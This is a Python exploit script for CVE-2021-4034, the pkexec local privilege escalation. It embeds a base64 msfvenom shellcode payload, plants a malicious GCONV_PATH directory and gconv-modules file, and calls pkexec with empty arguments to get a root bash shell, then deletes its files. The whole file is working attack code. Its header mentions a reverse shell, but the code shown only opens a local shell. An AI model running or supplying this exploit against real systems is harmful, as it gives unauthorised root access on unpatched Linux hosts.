#!/usr/bin/env python3

# CVE-2021-4034 in Python
# Originally by
# Joe Ammond (joe@ammond.org)
# https://haxx.in/files/blasty-vs-pkexec.c


# Modified by
# Wen Liang Goh (wlgoh.2020, SMU SCIS)
# Justin Lam (justin.lam.2020, SMU SCIS)
# Support for cleaning up and addition of reverse shell

import base64
import os
import sys
import shutil
import time

from ctypes import c_char_p, CDLL
from ctypes.util import find_library

# msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=true | base64
payload_bash = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAywEAAAAAAAAEAgAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVqO1iZSLsvYmluL3NoAFNIiedoLWMAAEiJ5lLoCgAAAC9iaW4vYmFzaABWV0iJ
5g8F
'''

payload = base64.b64decode(payload_bash)

# Set the environment for the call to execve()
environ = [
    b'exploit',
    b'PATH=GCONV_PATH=.',
    b'CHARSET=GROUP3',
    b'SHELL=../ErrorCausingCommand',
    None
]

# Fork the process to perform cleanup actions
def main():
    pid = os.fork()

    if pid == 0:
        # I am in the child process
        exploit_process()
    else:
        # I am in the parent process
        cleanup_process(pid)

def exploit_process():
    # Use libc to call C library without execve arguments
    try:
        libc = CDLL(find_library('c'))
    except:
        print('[!] Unable to find the C library.')
        sys.exit()

    # Create the GCONV_PATH=. directory
    try:
        os.mkdir('GCONV_PATH=.')
    except FileExistsError:
        print('[-] GCONV_PATH=. directory already exists, continuing.')
    except:
        print('[!] Failed making GCONV_PATH=. directory.')
        sys.exit()

    # Create a temporary exploit file
    try:
        with open('GCONV_PATH=./exploit', 'wb') as f:
            f.write(b'')
    except:
        print('[!] Failed creating exploit file')
        sys.exit()
    os.chmod('GCONV_PATH=./exploit', 0o0755)

    # Create directory "exploit" to hold configuration file and payload
    try:
        os.mkdir('exploit')
    except FileExistsError:
        print('[-] exploit directory already exists, continuing.')
    except:
        print('[!] Failed making exploit directory.')
        sys.exit()

    # Insert the shellcode into the payload
    print('[+] Creating shared library for exploit code.')
    try:
        with open('exploit/payload.so', 'wb') as f:
            f.write(payload)
    except:
        print('[!] Failed creating payload.so.')
        sys.exit()
    os.chmod('exploit/payload.so', 0o0755)

    # Create gconv-modules file
    try:
        with open('exploit/gconv-modules', 'wb') as f:
            f.write(b'module  UTF-8//    GROUP3//    ./payload    1\n');
    except:
        print('[!] Failed to create gconf-modules config file.')
        sys.exit()

    # Convert the environment to an array of char*
    environ_p = (c_char_p * len(environ))()
    environ_p[:] = environ

    print('[+] Calling execve()')
    # Call execve() with NULL arguments
    libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)

def cleanup_process(child_pid):
    time.sleep(1)
    shutil.rmtree("exploit")
    shutil.rmtree("GCONV_PATH=.")

    # print("[+] Initiating cleanup procedure")
    exit_code = os.waitpid(child_pid, 0)
    print("[-] Shell exited with code:", exit_code)

    shutil.rmtree("exploit", ignore_errors=True)
    shutil.rmtree("GCONV_PATH=.", ignore_errors=True)


if __name__ == "__main__":
    main()